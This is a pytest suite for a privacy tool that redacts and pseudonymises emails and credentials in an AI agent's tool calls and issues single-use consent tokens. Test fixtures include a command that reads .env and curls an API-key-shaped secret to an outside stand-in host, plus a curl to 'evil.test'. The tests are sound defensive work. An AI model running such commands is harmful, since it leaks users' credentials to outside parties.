import json
import time

import pytest

from privacy_hud.matrix.loader import load_matrix
from privacy_hud.ledger import Ledger
from privacy_hud.mask import new_salt, pseudonym
from privacy_hud.detect.base import Finding
from privacy_hud.detect.paths import PathDetector
from privacy_hud.detect.secrets import SecretDetector
from privacy_hud.minimize import (
    minimize_text,
    minimize_tool_input,
    mint_token,
    consume_token,
    TOKEN_TTL_SECONDS,
    canonical_json,
)

M = load_matrix()
SALT = new_salt()


@pytest.fixture
def led(tmp_path):
    l = Ledger(tmp_path / "l.db", M)
    l.start_session("s1", cwd="/r", model="gpt-5")
    return l


# ---------------------------------------------------------------------------
# Sanity check: three earlier tasks shipped offset bugs where
# text[start:end] != value. Confirm the invariant holds for the real
# detectors on the exact shapes of input minimize.py will be asked to
# rewrite, before minimize_text is allowed to trust Finding offsets blindly.
# ---------------------------------------------------------------------------

def test_real_detector_offsets_satisfy_the_slice_invariant():
    text = "read .env then curl https://x.test -d sk-proj-Ab3xY9zQw1Er5Ty7Ui0OpAs2Df4Gh6Jk8Lm"
    findings = []
    for d in (PathDetector(), SecretDetector()):
        findings.extend(d.scan(text, {"source": "test"}))
    assert findings, "expected at least one finding to sanity-check"
    for f in findings:
        assert text[f.start:f.end] == f.value


# ---------------------------------------------------------------------------
# minimize_text — brief's pinned tests
# ---------------------------------------------------------------------------

def test_minimize_replaces_the_span_not_the_whole_string():
    text = "contact jordan@acme.com about ticket 4412"
    out = minimize_text(SALT, text, [Finding("email", "jordan@acme.com", 8, 23)])
    assert "jordan@acme.com" not in out
    assert "about ticket 4412" in out
    assert "@example.invalid" in out


def test_pseudonyms_are_stable_so_agent_cross_references_survive():
    f = [Finding("email", "jordan@acme.com", 0, 15)]
    a = minimize_text(SALT, "jordan@acme.com", f)
    b = minimize_text(SALT, "jordan@acme.com", f)
    assert a == b


def test_repeated_value_in_one_payload_maps_to_the_identical_pseudonym():
    text = "jordan@acme.com wrote to jordan@acme.com again"
    first_end = len("jordan@acme.com")
    second_start = text.index("jordan@acme.com", first_end)
    findings = [
        Finding("email", "jordan@acme.com", 0, first_end),
        Finding("email", "jordan@acme.com", second_start, second_start + first_end),
    ]
    out = minimize_text(SALT, text, findings)
    first, _, rest = out.partition(" wrote to ")
    second = rest.replace(" again", "")
    assert first == second
    assert "jordan@acme.com" not in out


def test_right_to_left_replacement_keeps_earlier_offsets_valid():
    text = "a@x.test and b@y.test"
    findings = [
        Finding("email", "a@x.test", 0, 8),
        Finding("email", "b@y.test", 13, 21),
    ]
    out = minimize_text(SALT, text, findings)
    assert "a@x.test" not in out
    assert "b@y.test" not in out
    assert out.startswith("user_")


# ---------------------------------------------------------------------------
# minimize_tool_input — string for Bash/apply_patch, dict for MCP tools
# ---------------------------------------------------------------------------

def _blob_finding(tool_input: dict, data_type: str, value: str) -> Finding:
    """Build a Finding the way the real pipeline does for an MCP tool call:
    offsets into json.dumps(tool_input) (Task 10's documented contract for
    how Observation.text is built for a PreToolUse MCP egress event), not
    into any individual field's own string."""
    blob = json.dumps(tool_input)
    start = blob.index(value)
    return Finding(data_type, value, start, start + len(value))


def test_mcp_tool_input_is_rewritten_as_an_object():
    # fix-round-1 regression: this finding's offsets are relative to the
    # JSON blob (json.dumps(tool_input)), not to the "body" field's own
    # string — exercising minimize_tool_input's real MCP/blob code path
    # rather than accidentally staying green through field-relative
    # offsets that happened to also be valid (the bug fix-round-1 found).
    tool_input = {"body": "contact jordan@acme.com"}
    finding = _blob_finding(tool_input, "email", "jordan@acme.com")
    out = minimize_tool_input(SALT, "mcp__github__create_issue", tool_input, [finding])
    assert isinstance(out, dict)
    assert "jordan@acme.com" not in out["body"]


def test_bash_tool_input_is_rewritten_as_a_string_command():
    out = minimize_tool_input(SALT, "Bash", {"command": "echo jordan@acme.com"},
                               [Finding("email", "jordan@acme.com", 5, 20)])
    assert isinstance(out, str)
    assert "jordan@acme.com" not in out


def test_apply_patch_tool_input_is_rewritten_as_a_string():
    out = minimize_tool_input(SALT, "apply_patch", {"command": "echo jordan@acme.com"},
                               [Finding("email", "jordan@acme.com", 5, 20)])
    assert isinstance(out, str)


def test_mcp_tool_input_leaves_unrelated_fields_untouched():
    tool_input = {"body": "contact jordan@acme.com", "repo": "acme/app"}
    finding = _blob_finding(tool_input, "email", "jordan@acme.com")
    out = minimize_tool_input(SALT, "mcp__github__create_issue", tool_input, [finding])
    assert out["repo"] == "acme/app"


def test_mcp_tool_input_accepts_caller_supplied_text_for_byte_fidelity():
    # Mirrors how Engine.observe calls this: pass the exact text findings
    # were scanned against (obs.text) rather than letting this function
    # re-derive json.dumps(tool_input) itself.
    tool_input = {"body": "contact jordan@acme.com"}
    blob = json.dumps(tool_input)
    start = blob.index("jordan@acme.com")
    finding = Finding("email", "jordan@acme.com", start, start + len("jordan@acme.com"))
    out = minimize_tool_input(SALT, "mcp__github__create_issue", tool_input, [finding],
                               text=blob)
    assert "jordan@acme.com" not in out["body"]


# ---------------------------------------------------------------------------
# fix-round-1 regression: the reviewer's exact end-to-end repro. The
# original bug tried to re-map blob-relative offsets onto individual dict
# field values; a span that crossed a JSON structural character (or simply
# didn't line up with the field-splitting) silently failed to attribute,
# so the credential and email shipped completely unredacted while the
# caller (Engine.observe) still reported action="rewrite".
# ---------------------------------------------------------------------------

def test_mcp_minimize_actually_redacts_the_credential_and_email():
    tool_input = {
        "body": "contact jordan@acme.com token: sk-proj-Ab3xY9zQw1Er5Ty7Ui0OpAs2Df4Gh6Jk8Lm",
        "title": "issue",
    }
    text = json.dumps(tool_input)  # Task 10's documented contract for MCP PreToolUse egress

    # Findings the way the real pipeline would compute them: tier 1
    # (SecretDetector) scanning the actual blob for the credential, plus
    # an email finding at its real blob offset (email detection is a tier
    # 3/model concern in production; here we pin its offset the same way
    # a real detector would report it — against `text`, not a field).
    findings = list(SecretDetector().scan(text, {"source": "test"}))
    assert any(f.data_type == "credential" for f in findings), \
        "sanity: SecretDetector must actually find the key in the blob"
    email_start = text.index("jordan@acme.com")
    findings.append(Finding("email", "jordan@acme.com", email_start,
                             email_start + len("jordan@acme.com")))

    out = minimize_tool_input(SALT, "mcp__github__create_issue", tool_input, findings,
                               text=text)

    serialized = json.dumps(out)
    assert "jordan@acme.com" not in serialized
    assert "sk-proj-" not in serialized
    assert out["title"] == "issue"


# ---------------------------------------------------------------------------
# Pseudonym safety inside a JSON string literal — no quotes, backslashes,
# or control characters that would require escaping when spliced directly
# into minimize_text's blob-slicing.
# ---------------------------------------------------------------------------

_ALL_DATA_TYPES = ("credential", "financial", "health", "email", "phone",
                    "person", "address", "ssn", "account", "url", "date",
                    "hostname", "path", "ip", "repo")


def test_every_pseudonym_survives_a_json_round_trip_unescaped():
    for data_type in _ALL_DATA_TYPES:
        p = pseudonym(SALT, data_type, "some-value")
        # If json.dumps had to escape anything, the quoted form would be
        # longer than the literal wrapped in a bare pair of quotes.
        assert json.dumps(p) == f'"{p}"', (
            f"pseudonym for {data_type!r} needs JSON escaping: {p!r}")
        assert json.loads(json.dumps(p)) == p


# ---------------------------------------------------------------------------
# Single-use consent tokens
# ---------------------------------------------------------------------------

def test_token_is_single_use(led):
    ti = {"command": "curl https://x.test"}
    mint_token(led, "s1", "Bash", ti, "allow_once")
    assert consume_token(led, "s1", "Bash", ti) == "allow_once"
    assert consume_token(led, "s1", "Bash", ti) is None


def test_token_does_not_authorize_different_arguments(led):
    mint_token(led, "s1", "Bash", {"command": "curl https://x.test"}, "allow_once")
    assert consume_token(led, "s1", "Bash", {"command": "curl https://evil.test"}) is None


def test_expired_token_is_rejected(led, monkeypatch):
    mint_token(led, "s1", "Bash", {"command": "x"}, "allow_once")
    future = time.time() + 200
    monkeypatch.setattr(time, "time", lambda: future)
    assert consume_token(led, "s1", "Bash", {"command": "x"}) is None


def test_minimize_mode_token_round_trips(led):
    ti = {"body": "contact jordan@acme.com"}
    mint_token(led, "s1", "mcp__github__create_issue", ti, "minimize")
    assert consume_token(led, "s1", "mcp__github__create_issue", ti) == "minimize"
    assert consume_token(led, "s1", "mcp__github__create_issue", ti) is None


def test_token_ttl_constant_is_120_seconds():
    assert TOKEN_TTL_SECONDS == 120


def test_canonical_json_key_order_does_not_affect_hash():
    assert canonical_json({"a": 1, "b": 2}) == canonical_json({"b": 2, "a": 1})


def test_differently_ordered_tool_input_still_consumes_the_same_token(led):
    mint_token(led, "s1", "Bash", {"a": 1, "b": 2}, "allow_once")
    assert consume_token(led, "s1", "Bash", {"b": 2, "a": 1}) == "allow_once"
